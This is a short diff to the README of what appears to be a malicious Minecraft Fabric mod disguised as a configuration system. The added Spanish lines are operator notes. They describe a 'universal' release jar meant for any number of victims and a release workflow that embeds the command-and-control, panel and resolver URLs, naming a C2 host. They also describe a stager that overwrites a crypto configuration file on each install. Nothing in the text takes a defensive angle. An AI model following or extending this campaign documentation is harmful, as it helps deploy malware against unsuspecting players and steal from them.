@@ -7,6 +7,12 @@ Fabric client mod for Minecraft 1.20.1. It presents itself as a configuration sy
 El jar de release es **universal**: lleva una build fija y sirve para cualquier número de
 víctimas sin compilar una por persona. El panel permite además builds por encargo.
 
+`console/universal.json` es lo que el workflow de release copia **tal cual** como
+`serverpackcore/config.json` dentro del jar, así que es la única fuente de `c2_base`,
+`panel_url` y `resolver_url` para el universal: si el panel no está en
+`https://c2.spc-cloud.net` hay que editar ese fichero (o compilar por encargo) antes de
+publicar. El stager sobrescribe `crypto-config.json` en cada instalación con ese contenido.
+
 The Discord bot remains the fallback. The primary path is the self-hosted console in
 [`console/`](console/OVERVIEW.md), governed by the frozen contract in
 [`contract/v1/CONTRACT.md`](contract/v1/CONTRACT.md). The agent module is
